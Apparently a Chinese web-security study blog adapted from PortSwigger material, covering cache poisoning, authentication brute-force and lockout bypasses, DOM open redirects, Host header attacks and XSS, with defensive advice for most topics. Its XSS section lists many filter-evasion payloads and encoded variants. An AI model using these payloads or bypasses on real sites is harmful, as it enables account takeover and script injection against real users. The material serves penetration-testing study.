中毒响应只会提供给在缓存中毒时访问受影响页面的用户。因此，根据页面是否受欢迎，影响可能从不存在到巨大。例如，如果攻击者设法使主要网站主页上的缓存响应中毒，则攻击可能会影响数千名用户，而无需攻击者进行任何后续交互。
请注意，缓存条目的持续时间不一定会影响 Web 缓存中毒的影响。攻击通常可以以这样一种方式编写，即它无限期地重新毒害缓存。

### 构建网络缓存中毒攻击

一般来说，构建一个基本的Web缓存中毒攻击包括以下几个步骤：

1. 判断哪些非缓存键会影响页面内容

   任何的缓存投毒都依赖于非缓存键，所以我们在一开始就要判断哪些HTTP头部属于缓存键，哪些不属于。再通过修改或添加HTTP头部来判断哪些头部会引起页面内容的变化。常用的两种方式：

   1. 手动修改或添加HTTP头部，指定随机字符来判断头部是否影响页面内容
    > 例如直接反映响应中的输入，或触发完全不同的响应。然而，有时效果更微妙，需要一些侦探工作才能弄清楚。您可以使用 Burp Comparer 等工具来比较有和没有注入输入的响应，但这仍然需要大量的手动工作。
    
   2. 使用Brupsuite插件[Param Miner](https://github.com/portswigger/param-miner)来自动判断
   > 您只需右键单击要调查的请求，然后单击“Guess headers”。Param Miner 然后在后台运行，从其广泛的内置标头列表发送包含不同输入的请求。如果包含其注入输入之一的请求对响应有影响，Param Miner 将其记录在 Burp 中，如果您使用的是Burp Suite Professional，则在“问题”窗格中，或在扩展程序的“输出”选项卡中（“扩展器”>“扩展”>“ Param Miner”>“输出”
![在这里插入图片描述](https://img-blog.csdnimg.cn/bd3f748086784ac29fd73f09c693f71b.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5YyX5LiQ5a6J5YWo,size_20,color_FFFFFF,t_70,g_se,x_16)
注意：在实时网站上测试无键输入时，存在无意中导致缓存将生成的响应提供给真实用户的风险。因此，重要的是要确保您的请求都具有唯一的缓存键，以便它们只会提供给您。为此，您可以在每次发出请求时手动向请求行添加缓存破坏者（例如唯一参数）。或者，如果您使用的是 Param Miner，则可以选择为每个请求自动添加缓存破坏器。

2. 构造内容引起服务器端的有害响应

   针对不同的非缓存键，我们需要知道哪些非缓存键会导致页面返回有害的内容。举一个例子：页面中js链接的域名是通过获取HTTP头部中的“X-Forwarded-Host”字段来设置的。而服务器不会将这个字段作为缓存键，那么这个字段就可以利用。

3. 获取响应，使有害内容被缓存

   通过构造有害的内容，访问页面，获取响应。就会将有害的内容存入缓存中。需要注意的是，页面是否会被缓存受到文件扩展名、内容类型、url路由、状态代码和响应标头的影响。在测试的会比较麻烦。

看完上面这几个步骤，应该对投毒的过程有了一个大概的了解。现在我们通过几个实验例子来学习具体的缓存利用方式。这里的实验环境为Brupsuite社区的缓存投毒实验案例。目的都是通过缓存投毒来导致XSS漏洞。



####  从后端服务器引出有害响应

一旦您确定了未加密的输入，下一步就是准确评估网站如何处理它。了解这一点对于成功引发有害反应至关重要。如果输入反映在来自服务器的响应中而没有经过适当的清理，或者用于动态生成其他数据，那么这就是 Web 缓存中毒的潜在入口点。

####  获取缓存的响应

操纵输入以引起有害响应是成功的一半，但除非您可以使响应被缓存，否则它不会取得太大成果，这有时会很棘手。

响应是否被缓存取决于各种因素，例如文件扩展名、内容类型、路由、状态代码和响应标头。您可能需要花一些时间来简单地处理不同页面上的请求并研究缓存的行为。一旦您弄清楚如何缓存包含您的恶意输入的响应，您就可以准备向潜在受害者提供漏洞利用。
![在这里插入图片描述](https://img-blog.csdnimg.cn/fb1280dd1e3041b288e7c1e9e2d07b72.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5YyX5LiQ5a6J5YWo,size_20,color_FFFFFF,t_70,g_se,x_16)

####  如何防止网页缓存中毒漏洞

防止 Web 缓存中毒的最终方法显然是完全禁用缓存。虽然对于许多网站来说，这可能不是一个现实的选择，但在其他情况下，它可能是可行的。例如，如果您只使用缓存，因为它在您采用 CDN 时默认开启，那么可能值得评估默认缓存选项是否确实反映了您的需求。

即使您确实需要使用缓存，将其限制为纯静态响应也是有效的，前提是您对分类为“静态”的内容足够警惕。例如，确保攻击者无法欺骗后端服务器检索静态资源的恶意版本而不是真正的资源。

这也与关于网络安全的更广泛的观点有关。大多数网站现在都将各种第三方技术纳入其开发流程和日常运营中。无论您自己的内部安全状况多么强大，一旦您将第三方技术纳入您的环境，您就会依赖于它的开发人员也和您一样具有安全意识。基于您的安全性取决于您的最弱点，因此在集成任何第三方技术之前确保您完全了解其安全含义至关重要。

特别是在 Web 缓存中毒的情况下，这不仅意味着决定是否默认启用缓存，还意味着查看您的 CDN 支持哪些标头。由于攻击者能够操纵一系列模糊的请求标头，其中许多对于网站的功能而言完全不需要，因此暴露了上面讨论的几个 Web 缓存中毒漏洞。同样，您可能会在没有意识到的情况下将自己暴露在这些类型的攻击中，这纯粹是因为您已经实施了一些默认支持这些未加密输入的技术。如果站点工作不需要标头，则应将其禁用。

在实现缓存时，您还应该采取以下预防措施：

如果出于性能原因考虑从缓存键中排除某些内容，请改写请求。
不接受胖GET请求。请注意，某些第三方技术可能默认允许这样做。
修补客户端漏洞，即使它们看起来无法利用。由于缓存行为中不可预测的怪癖，其中一些漏洞实际上可能被利用。有人发现一个怪癖（无论是基于缓存还是其他方式）使该漏洞可被利用可能只是时间问题。

## 身份验证漏洞

### 身份验证漏洞是如何产生的？

从广义上讲，身份验证机制中的大多数漏洞都以以下两种方式之一出现：

* 身份验证机制很弱，因为它们无法充分防止暴力攻击。
* 实现中的逻辑缺陷或糟糕的编码允许攻击者完全绕过身份验证机制。这有时称为“损坏的身份验证”。

在 Web 开发的许多领域，逻辑缺陷只会导致网站出现意外行为，这可能是也可能不是安全问题。然而，由于身份验证对安全性如此重要，有缺陷的身份验证逻辑使网站面临安全问题的可能性明显增加。

### 基于密码登录的漏洞

#### 暴力攻击

##### 暴力破解用户名

如果用户名符合可识别的模式（例如电子邮件地址），则用户名特别容易猜到。例如，在格式中看到业务登录是很常见的firstname.lastname@somecompany.com。然而，即使没有明显的模式，有时甚至使用可预测的用户名创建高特权帐户，例如admin或administrator。

在审核过程中，检查网站是否公开披露了潜在的用户名。例如，您能否在不登录的情况下访问用户配置文件？即使配置文件的实际内容被隐藏，配置文件中使用的名称有时与登录用户名相同。您还应该检查 HTTP 响应以查看是否泄露了任何电子邮件地址。有时，回复包含管理员和 IT 支持等高权限用户的电子邮件地址

##### 暴力破解密码

密码也可以类似地被暴力破解，其难度因密码的强度而异。许多网站采用某种形式的密码策略，迫使用户创建高熵密码，至少从理论上讲，单独使用蛮力更难破解。这通常涉及通过以下方式强制执行密码：

最少字符数
小写和大写字母的混合
至少一个特殊字符
然而，虽然高熵密码很难由计算机单独破解，但我们可以利用人类行为的基本知识来利用用户在不知不觉中引入该系统的漏洞。与使用随机字符组合创建强密码不同，用户通常会使用他们可以记住的密码，并尝试将其撬开以适应密码策略。例如，如果mypassword不允许，用户可以尝试类似Mypassword1!或Myp4$$w0rd替代的方法。

在策略要求用户定期更改密码的情况下，用户只需对其首选密码进行微小的、可预测的更改也很常见。例如，Mypassword1!变成Mypassword1?或Mypassword2!.

了解可能的凭据和可预测的模式意味着暴力攻击通常比简单地迭代每个可能的字符组合更复杂，因此更有效。

##### 用户名枚举

用户名枚举是指攻击者能够观察网站行为的变化，以确定给定的用户名是否有效。

如果一开始通过响应时间枚举出了用户名，将大大降低爆破密码的时间成本，用集束炸弹在实际中耗时间要比狙击手慢N倍

在尝试对登录页面进行暴力破解时，您应该特别注意以下方面的任何差异：

* **状态代码**：在暴力攻击期间，返回的 HTTP 状态代码对于绝大多数猜测可能是相同的，因为大多数猜测都是错误的。如果猜测返回不同的状态代码，这强烈表明用户名是正确的。无论结果如何，网站始终返回相同的状态代码是最佳做法，但并不总是遵循这种做法。
  ![在这里插入图片描述](https://img-blog.csdnimg.cn/4be0c65df42c4de9988912da296f55d9.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5YyX5LiQ5a6J5YWo,size_20,color_FFFFFF,t_70,g_se,x_16)

* **错误消息**：有时返回的错误消息会有所不同，具体取决于用户名和密码是否都不正确或仅密码不正确。网站的最佳做法是在这两种情况下使用相同的通用消息，但有时会出现小的打字错误。只要一个字符错位，就会使两条消息不同，即使在呈现的页面上看不到该字符的情况下也是如此。
  ![在这里插入图片描述](https://img-blog.csdnimg.cn/91619ca902984239a90ce41785794c0e.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5YyX5LiQ5a6J5YWo,size_18,color_FFFFFF,t_70,g_se,x_16)
  ![在这里插入图片描述](https://img-blog.csdnimg.cn/fa8fdee921fc4124b087dbca0f089f99.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5YyX5LiQ5a6J5YWo,size_20,color_FFFFFF,t_70,g_se,x_16)

* **响应时间**：如果大多数请求都以类似的响应时间处理，任何与此不同的请求都表明幕后发生了一些不同的事情。这是猜测的用户名可能是正确的另一个迹象。例如，如果用户名有效，网站可能只检查密码是否正确。这个额外的步骤可能会导致响应时间略有增加。这可能是微妙的，但攻击者可以通过输入一个过长的密码来使这种延迟更加明显，网站需要更长的时间来处理该密码。
  ![在这里插入图片描述](https://img-blog.csdnimg.cn/fb571c83124345f9b0c0e803d738703a.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5YyX5LiQ5a6J5YWo,size_20,color_FFFFFF,t_70,g_se,x_16)

### 有缺陷的蛮力保护

* 如果远程用户尝试登录失败次数过多，则锁定他们尝试访问的帐户
* 如果远程用户的 IP 地址快速连续进行过多的登录尝试，则阻止远程用户的 IP 地址
  两种方法都提供不同程度的保护，但都不是无懈可击的，尤其是在使用有缺陷的逻辑实施时。

##### IP封锁

例如，如果您登录失败的次数过多，有时您可能会发现您的 IP 被阻止。在某些实现中，如果 IP 所有者成功登录，则失败尝试次数的计数器会重置。这意味着攻击者只需每隔几次尝试登录自己的帐户即可防止达到此限制。

在这种情况下，仅在整个单词列表中定期包含您自己的登录凭据就足以使这种防御几乎毫无用处。

只需要在尝试计数器之间交替出现正确的账户名和密码，如果爆破字典很大这通常需要用一个脚本自动间隔插入账号和密码

##### 账户锁定

网站尝试防止暴力破解的一种方法是在满足某些可疑标准时锁定帐户，通常是一定数量的失败登录尝试。就像正常的登录错误一样，来自服务器的响应表明帐户被锁定也可以帮助攻击者枚举用户名。

加一个空白的有效负载位置。结果应该是这个样子：username=§invalid-username§&password=example§§。
在“有效负载”选项卡上，将用户名列表添加到第一个有效负载集。对于第二组，选择“Null payloads”类型并选择生成 5 个有效载荷的选项。这将有效地导致每个用户名重复 5 次。开始攻击。
在结果中，请注意其中一个用户名的响应比使用其他用户名时的响应长。更仔细地研究响应并注意它包含不同的错误消息：You have made too many incorrect login attempts.记下此用户名

##### 用户限速

网站尝试防止暴力攻击的另一种方法是通过用户速率限制。在这种情况下，在短时间内发出过多的登录请求会导致您的 IP 地址被阻止。通常，只能通过以下方式之一解锁 IP：

* 经过一定时间后自动
* 由管理员手动
* 成功完成验证码后由用户手动操作

用户速率限制有时比帐户锁定更受欢迎，因为它不太容易发生用户名枚举和拒绝服务攻击。但是，它仍然不是完全安全的。正如我们在早期实验室中看到的一个例子，攻击者可以通过多种方式操纵他们的明显 IP 以绕过该块。

由于该限制基于从用户 IP 地址发送的 HTTP 请求的速率，因此如果您可以计算出如何通过单个请求猜测多个密码，有时也可以绕过此防御。
以下是每个请求有多个凭证绕过检测的情况。
![在这里插入图片描述](https://img-blog.csdnimg.cn/9e01e9264c2b4819956e6e6dcc80645b.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5YyX5LiQ5a6J5YWo,size_19,color_FFFFFF,t_70,g_se,x_16)
![在这里插入图片描述](https://img-blog.csdnimg.cn/cdaf6178999c45f583659a24c7c6d5d3.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5YyX5LiQ5a6J5YWo,size_20,color_FFFFFF,t_70,g_se,x_16)

### 多因素身份验证中的漏洞

双因素身份验证显然比单因素身份验证更安全。但是，与任何安全措施一样，它的安全性取决于其实施。实施不佳的双因素身份验证可能会被击败，甚至可以完全绕过，就像单因素身份验证一样。

#### 绕过两步验证

 有时，两因素身份验证的实施存在缺陷，可以完全绕过它
如果首先提示用户输入密码，然后在单独的页面上提示输入验证码，则用户在输入验证码之前实际上处于“登录”状态。在这种情况下，值得测试一下，看看在完成第一个身份验证步骤后是否可以直接跳到“仅限登录”页面。有时，您会发现网站在加载页面之前实际上并没有检查您是否完成了第二步。

## 基于 DOM 的漏洞

### 什么是DOM？

文档对象模型 (DOM) 是网页浏览器对页面元素的分层表示。网站可以使用 JavaScript 来操作 DOM 的节点和对象，以及它们的属性。DOM 操作本身不是问题。事实上，它是现代网站工作方式不可或缺的一部分。但是，不安全地处理数据的 JavaScript 可能会引发各种攻击。**当网站包含的 JavaScript 获取攻击者可控制的值（称为源）并将其传递到危险函数（称为接收器）时**，就会出现基于 DOM 的漏洞。

### 污点流漏洞

要利用或缓解这些漏洞，首先熟悉源和接收器之间的污点流的基础知识很重要。
源

> 源是一个 JavaScript 属性，它接受可能受攻击者控制的数据。源的一个例子是location.search属性，因为它从查询字符串中读取输入，这对于攻击者来说相对容易控制。最终，攻击者可以控制的任何财产都是潜在的来源。这包括引用 URL（由document.referrer字符串公开）、用户的 cookie（由document.cookie字符串公开）和网络消息。

接收器

> 接收器是一种潜在危险的 JavaScript 函数或 DOM 对象，如果将攻击者控制的数据传递给它，可能会导致不良影响。例如，该eval()函数是一个接收器，因为它处理作为 JavaScript 传递给它的参数。HTML 接收器的一个示例是document.body.innerHTML因为它可能允许攻击者注入恶意 HTML 并执行任意 JavaScript。
>
> 从根本上说，当网站将数据从源传递到接收器，然后接收器在客户端会话的上下文中以不安全的方式处理数据时，就会出现基于 DOM 的漏洞。

最常见的源是 URL，通常通过location对象访问。攻击者可以构建一个链接，将受害者发送到带有查询字符串和 URL 片段部分的有效负载的易受攻击页面。考虑以下代码：

```bash
# hash 属性是一个可读可写的字符串，该字符串是 URL 的锚部分（从 # 号开始的部分）goto = location.hash.slice(1)if (goto.startsWith('https:')) {  location = goto;}
```

这很容易受到基于 DOM 的开放重定向的影响，因为location.hash以不安全的方式处理源。如果 URL 包含以 开头的哈希片段https:，则此代码提取location.hash属性的值并将其设置为 的location属性window。攻击者可以通过构建以下 URL 来利用此漏洞：

https://www.innocent-website.com/example#https://www.evil-user.net

当受害者访问此 URL 时，JavaScript 将该location属性的值设置为https://www.evil-user.net，这会自动将受害者重定向到恶意站点。例如，这种行为很容易被利用来构建网络钓鱼攻击。
常见来源
以下是可用于利用各种污点流漏洞的典型来源：

document.URL
document.documentURI
document.URLUnencoded
document.baseURI
location
document.cookie
document.referrer
window.name
history.pushState
history.replaceState
localStorage
sessionStorage
IndexedDB (mozIndexedDB, webkitIndexedDB, msIndexedDB)
Database

以下类型的数据也可用作利用 taint-flow 漏洞的来源：

> 反射数据
> 存储数据  
> 网络消息  

### 如何防止基于 DOM 的污点流漏洞

您无法采取任何单一措施来完全消除基于 DOM 的攻击的威胁。但是，一般来说，避免基于 DOM 的漏洞的最有效方法是避免允许来自任何不受信任来源的数据动态更改传输到任何接收器的值。

如果应用程序所需的功能意味着这种行为是不可避免的，则必须在客户端代码中实现防御。在许多情况下，可以在白名单的基础上验证相关数据，只允许已知安全的内容。在其他情况下，需要清理或编码数据。这可能是一项复杂的任务，并且根据要插入数据的上下文，可能涉及按适当顺序组合使用 JavaScript 转义、HTML 编码和 URL 编码。

有关您可以采取的防止特定漏洞的措施，请参阅上表中链接的相应漏洞页面。

### DOM 破坏

DOM clobbering 是一种高级技术，您可以在其中将 HTML 注入页面以操作 DOM 并最终更改网站上 JavaScript 的行为。DOM 破坏的最常见形式是使用锚元素覆盖全局变量，然后应用程序以不安全的方式使用该变量，例如生成动态脚本 URL。

## HTTP 主机头攻击

### 什么是 HTTP 主机标头？

从 HTTP/1.1 开始，HTTP Host 标头是强制性的请求标头。它指定客户端要访问的域名。例如，当用户访问 时https://portswigger.net/web-security，他们的浏览器将编写一个包含 Host 标头的请求，如下所示：

GET /web-security HTTP/1.1
Host: portswigger.net

在某些情况下，例如当请求已由中间系统转发时，Host 值可能会在它到达预期的后端组件之前被更改。我们将在下面更详细地讨论这种情况。

### HTTP Host 标头的目的是什么？

HTTP Host 标头的目的是帮助识别客户端想要与之通信的后端组件。如果请求不包含 Host 标头，或者 Host 标头以某种方式格式错误，这可能会导致将传入请求路由到预期应用程序时出现问题。

从历史上看，这种歧义并不存在，因为每个 IP 地址只会托管单个域的内容。如今，主要是由于基于云的解决方案和外包大部分相关架构的不断增长的趋势，多个网站和应用程序可以在同一个 IP 地址上访问是很常见的。这种方法也越来越流行，部分原因是 IPv4 地址耗尽。

当多个应用程序可通过同一 IP 地址访问时，这通常是以下情况之一的结果。

#### 虚拟主机

一种可能的情况是单个 Web 服务器托管多个网站或应用程序。这可能是一个所有者的多个网站，但也可以将拥有不同所有者的网站托管在一个共享平台上。这不像以前那么常见，但仍然会出现在一些基于云的 SaaS 解决方案中。

在任何一种情况下，虽然这些不同的网站中的每一个都有不同的域名，但它们都与服务器共享一个公共 IP 地址。在单个服务器上以这种方式托管的网站被称为“虚拟主机”。

对于访问网站的普通用户来说，虚拟主机通常与托管在其自己的专用服务器上的网站无法区分。

#### 通过中介路由流量

另一种常见情况是网站托管在不同的后端服务器上，但客户端和服务器之间的所有流量都通过中间系统路由。这可能是一个简单的负载平衡器或某种反向代理服务器。这种设置在客户端通过内容交付网络 (CDN) 访问网站的情况下尤为普遍。

在这种情况下，即使网站托管在单独的后端服务器上，它们的所有域名也解析为中间组件的单个 IP 地址。这带来了一些与虚拟主机相同的挑战，因为反向代理或负载平衡器需要知道它应该将每个请求路由到的适当后端。

#### HTTP Host 头是如何解决这个问题的？

在这两种情况下，都依赖 Host 标头来指定预期的收件人。一个常见的类比是给住在公寓楼的人寄一封信的过程。整栋建筑都有相同的街道地址，但在这个街道地址后面有许多不同的公寓，每个公寓都需要以某种方式接收正确的邮件。解决此问题的一种方法是简单地在地址中包含公寓号或收件人姓名。在 HTTP 消息的情况下，Host 头用于类似的目的。

当浏览器发送请求时，目标 URL 将解析为特定服务器的 IP 地址。当此服务器收到请求时，它会参考 Host 标头来确定预期的后端并相应地转发请求。

### 什么是 HTTP 主机标头攻击？

HTTP Host 标头攻击利用易受攻击的网站，这些网站以不安全的方式处理 Host 标头的值。如果服务器隐式信任 Host 标头，并且未能正确验证或转义它，则攻击者可能能够使用此输入注入操纵服务器端行为的有害负载。涉及将有效负载直接注入主机标头的攻击通常称为“主机标头注入”攻击。

除非在安装过程中在配置文件中手动指定，否则现成的 Web 应用程序通常不知道它们部署在哪个域上。当他们需要知道当前域时，例如，要生成包含在电子邮件中的绝对 URL，他们可能会求助于从 Host 标头中检索域：

<a href="https://_SERVER['HOST']/support">Contact support</a>

标头值还可用于网站基础设施的不同系统之间的各种交互。

由于 Host 标头实际上是用户可控制的，因此这种做法可能会导致许多问题。如果输入未正确转义或验证，则 Host 标头是利用一系列其他漏洞的潜在载体，最显着的是：

* 网页缓存中毒
* 特定功能中的 业务逻辑缺陷
* 基于路由的SSRF
* 经典的服务器端漏洞，例如 SQL 注入

### HTTP 主机头漏洞是如何产生的？

HTTP Host 标头漏洞通常是由于用户无法控制标头的错误假设而出现的。这会在 Host 标头中创建隐式信任并导致验证不充分或对其值进行转义，即使攻击者可以使用 Burp Proxy 等工具轻松修改它。

即使 Host 标头本身被更安全地处理，根据处理传入请求的服务器的配置，Host 可能会通过注入其他标头而被覆盖。有时网站所有者不知道默认情况下支持这些标头，因此，它们可能不会受到相同级别的审查。

事实上，许多这些漏洞的出现并不是因为不安全的编码，而是因为相关基础设施中一个或多个组件的不安全配置。之所以会出现这些配置问题，是因为网站将第三方技术集成到其架构中，而不必了解配置选项及其安全含义。

### 如何验证http主机头漏洞？

通过修改 Host 标头，利用burp发送请求看是否到达目标应用程序。具体
step1: 将Host 标头修改成任意的、无法识别的域名时观察会发生什么。（返回指定网站存在http主机头漏洞）
sep2：step1更大可能返回的结果是报Invalid Host header。可能是因为以下中原因导致的：

* 网站存在CDN,CDN无法识别解析
* 某些网站会验证 Host 标头是否与来自 TLS 握手的 SNI 匹配
* 这时候需要继续验证：
 * 某些解析算法会从 Host 标头中省略端口，这意味着仅验证域名。如果您还能够提供非数字端口，则可以保持域名不变以确保到达目标应用程序，同时可能通过端口注入有效负载，类似于：

GET /example HTTP/1.1
Host: vulnerable-website.com:bad-stuff-here

其他站点将尝试应用匹配逻辑以允许任意子域。在这种情况下，您可以通过注册一个以与列入白名单的字符序列相同的字符序列结尾的任意域名来完全绕过验证：

GET /example HTTP/1.1
Host: notvulnerable-website.com

或者，您可以利用您已经攻陷的安全性较低的子域：

GET /example HTTP/1.1
Host: hacked-subdomain.vulnerable-website.com


### 如何利用http主机头漏洞？

**注入重复的主机标头**
一种可能的方法是尝试添加重复的 Host 标头。诚然，这通常只会导致您的请求被阻止。但是，由于浏览器不太可能发送这样的请求，您可能偶尔会发现开发人员没有预料到这种情况。在这种情况下，您可能会暴露一些有趣的行为怪癖。

不同的系统和技术会以不同的方式处理这种情况，但通常两个标头之一优先于另一个标头，从而有效地覆盖其值。当系统不同意哪个标头是正确的标头时，这可能会导致您可以利用的差异。考虑以下请求：
GET /example HTTP/1.1
Host: vulnerable-website.com
Host: bad-stuff-here
假设前端优先于标头的第一个实例，但后端更喜欢最后一个实例。在这种情况下，您可以使用第一个标头来确保您的请求被路由到预期目标，并使用第二个标头将您的有效负载传递到服务器端代码中。

### 如何防止HTTP Host头攻击

如何防止HTTP Host头攻击
为了防止 HTTP Host 标头攻击，最简单的方法是避免在服务器端代码中完全使用 Host 标头。仔细检查每个 URL 是否真的需要是绝对的。您经常会发现，您可以只使用相对 URL。这种简单的更改可以帮助您特别防止Web 缓存中毒漏洞。

其他防止 HTTP Host 标头攻击的方法包括：

保护绝对 URL
当您必须使用绝对 URL 时，您应该要求在配置文件中手动指定当前域并引用此值而不是 Host 标头。例如，这种方法将消除密码重置中毒的威胁。

验证主机标头
如果您必须使用 Host 标头，请确保正确验证它。这应该涉及根据允许域的白名单进行检查，并拒绝或重定向对无法识别的主机的任何请求。您应该查阅框架的文档以获取有关如何执行此操作的指导。例如，Django 框架ALLOWED_HOSTS在设置文件中提供了该选项。这种方法将减少您遭受 Host 标头注入攻击的风险。

不支持主机覆盖标头
检查您是否不支持可用于构建这些攻击的其他标头也很重要，尤其是X-Forwarded-Host. 请记住，默认情况下可能支持这些。

白名单允许的域
为了防止对内部基础设施的基于路由的攻击，您应该配置您的负载平衡器或任何反向代理，以仅将请求转发到允许域的白名单。

小心使用仅限内部的虚拟主机
使用虚拟主机时，您应该避免在与面向公众的内容相同的服务器上托管仅供内部使用的网站和应用程序。否则，攻击者可能能够通过主机头操作访问内部域。

## 跨站脚本（xss）

### 什么是xss

xss是一种 Web 安全漏洞，xss攻击对提交表单或发出的链接请求中所有变量嵌入执行javascript脚本，所以xss的执行结果可以通过过滤拦截可以通过源码读取,javascript脚本能执行多强(可绕过同源策略即：允许攻击者伪装成受害者用户，执行用户能够执行的任何操作，并访问用户的任何数据)就意味着xss能达到什么样的攻击。


### XSS 攻击有哪些类型？

XSS 攻击主要分为三种类型。这些是：

反射型 XSS，其中恶意脚本来自当前的 HTTP 请求。
存储的 XSS，其中恶意脚本来自网站的数据库。
基于 DOM 的 XSS，该漏洞存在于客户端代码而不是服务器端代码中。



#### DOM型XSS

在以下示例中，应用程序使用一些 JavaScript 从输入字段读取值并将该值写入 HTML 中的元素：

var search = document.getElementById('search').value;
var results = document.getElementById('results');
results.innerHTML = 'You searched for: ' + search;

如果攻击者可以控制输入字段的值，他们就可以很容易地构造一个恶意值来执行自己的脚本：

```bash
You searched for: <img src=1 onerror='/* Bad stuff here... */'>
```

在典型情况下，输入字段将从 HTTP 请求的一部分填充，例如 URL 查询字符串参数，允许攻击者以与反射 XSS 相同的方式使用恶意 URL 进行攻击。

### XSS 可以用来做什么？

利用跨站点脚本漏洞的攻击者通常能够：

冒充或伪装成受害者用户。
执行用户能够执行的任何操作。
读取用户能够访问的任何数据。
捕获用户的登录凭据。
对网站进行虚拟篡改。
将特洛伊木马功能注入网站。

### XSS 漏洞的影响

XSS 攻击的实际影响通常取决于应用程序的性质、其功能和数据，以及受感染用户的状态。例如：

* 在宣传册应用程序中，所有用户都是匿名的，所有信息都是公开的，影响通常很小。
* 在保存敏感数据（例如银行交易、电子邮件或医疗记录）的应用程序中，影响通常会很严重。
* 如果受感染用户在应用程序中具有提升的权限，那么影响通常很严重，允许攻击者完全控制易受攻击的应用程序并危害所有用户及其数据。

### XSS 漏洞验证

### 手动XSS验证语句思路

也有很多人使用alert(document.domain)来明确是在哪个域上执行的方法
alert()。alert传参有多种思路，具体可以依次尝试以下策略

```bash
（alert)(1);   		alert(1);		    alert`1`;           
```

从版本 92 开始（2021 年 7 月 20 日） Chrome跨域 iframe 被阻止调用导致alert失效，现在你可以采用
print()

我常常在插入html编码的xss语句发现网站的SQL源码


**常规payload，黑盒中一般一个测试注入点会每条都尝试**

```bash
<script>alert(1)</script><b onmouseover=alert(1)>Click Me!</b><svg onload=alert(1)><body onload="alert('XSS')"><img src="ddksah" onerror=alert(1);>  <a href="javascript:alert(1)">sfdst</a>
```


 **一些实用性高的payload**

```bash
 <a href="javascript&#58;alert('<%E6%B5%8B%E8%AF%95\>')">jump</a> 
```

參考https://segmentfault.com/a/1190000019980090


**绕过（通常一句XSS代码会同时结合以下策略）**
浏览器进行绘制时，解码顺序分别为 HTML > URL > JS；
使用html编码 https://tool.oschina.net/encode/


**过滤了 ’，“，<,> 没有过滤引号** 

```bash
' οnclick='alert(/xss/) 'javascript:alert(/xss/)
```

其中用伪协议的标签有：

```bash
<a>标签：<a href="javascript:alert(`xss`);">xss</a><iframe>标签：<iframe src=javascript:alert('xss');></iframe><img>标签：<img src=javascript:alert('xss')>		//IE7以下<form>标签：<form action="Javascript:alert(1)"><input type=submit>
```

或者你可以选择制造伪协议

```bash
<img src=1 onerror=location='javascript:%61%6C%65%72%74%28%31%29'><img src=1 onerror=location='javascript:\x61\x6C\x65\x72\x74\x28\x31\x29'><img src=1 onerror=location="javascr"+"ipt:"+"%61%6C%65%72%74%28%31%29">
```

**过滤引号**
无法闭合第一个引号:反斜杠转义回去/宽字节（GBK等编码格式）
第二个引号：注释符号<!--或//

**过滤空格**

```bash
<img/src="1"/onerror=alert(1)>
```

用%0a代替空格

**过滤括号**

```bash
<img src=1 onerror="window.οnerrοr=eval;throw'=alert\x281\x29';">
```

**闭合标签**
注释符可以当做`</span>`的斜杠

```bash
<<!--> span> <a href="" onclick="alert(document.cookie)">123456 </a>
```

```bash
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert(2222222222222222) )
```



**关键字被替代**
多个script嵌套
大小写

**关键字屏蔽绕过**
1 当js解释器在标识符名称(例如函数名，属性名等等)中遇到unicode编码会进行解码，并使其标志符照常生效。而在字符串中遇到unicode编码时会进行解码只会被当作字符串。

> \u003c 来代替左括号（小于括号 ’<‘ ）
> \u003e 来代替右括号（大于括号 ‘>’ ）
> \u0022 来代替 双引号 （ ” ）
> \u0027 来代替 单引号 （ ’ ）

一般\不会被实体化，这样可以用来配合十六进制或者八进制来进行绕过斜杠在JAVASCRIPT有着特殊的用途，它是转义的符号

2 有些时候加上注释后可能可以绕过后台过滤机制

```bash
<scri<!--test-->pt>alert(111)</sc<!--test-->ript>
```

3 拼接字符

```bash
<video/src/onerror=Function('ale'%2B'rt(1)')();><img src=x"οnerrοr="a=`aler`;b=`t`;c='`xss`);';eval(a+b+c)">
```

4 特殊函数

```bash
<img src=1 onerror=eval(atob('YWxlcnQoMSk='))>
```

利用top，加密函数(parseInt和toString互逆)

```bash
<video/src/onerror=top[8680439..toString(30)](1);><video/src/onerror=top[11189117..toString(32)](1);><img src="x"onerror="eval(String.fromCharCode(97,108,101,114,116,40,34,120,115,115,34,41,59))">
```

参考：https://blog.csdn.net/qq_42990434/article/details/106427376?spm=1001.2014.3001.5501
payload，结合上面知识点总结的：

```bash
<<!--> span>\u003cSc<!--test-->Rpt>
```

**通用逃逸**
用优先级运算绕过如+alert(1)+或-alert(1)-或in alert(1) in
大小写混写
%0a

**恶意绕过的payload关键字**

```bash
空格'#/\(<!-->evaltop
```


#### 快速XSS验证

##### burpsuite的XSS清单

利用burpsuite提供的[清单，](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)。并利用爆破依次跑，[具体跑的方法可见](https://www.freebuf.com/articles/web/289478.html)

##### XSStrike

 [XSStrike快速验证可测试payload](https://github.com/s0md3v/XSStrike)
外国人的项目，自带识别并绕过WAF(由于是外国开发的项目，可能对于中国的一些WAF识别不是很好，但是它的测试仍旧是走对的)所以 如果用在国内的项目探测出WAF：offline不要确定没有WAF。

 - XSStrike主要特点反射和DOM XSS扫描 多线程爬虫 Context分析 可配置的核心 检测和规避WAF 老旧的JS库扫描
   只能payload生成器 手工制作的HTML&JavaScript解析器 强大的fuzzing引擎 盲打XSS支持 高效的工作流
   完整的HTTP支持 Bruteforce payloads支持 Payload编码

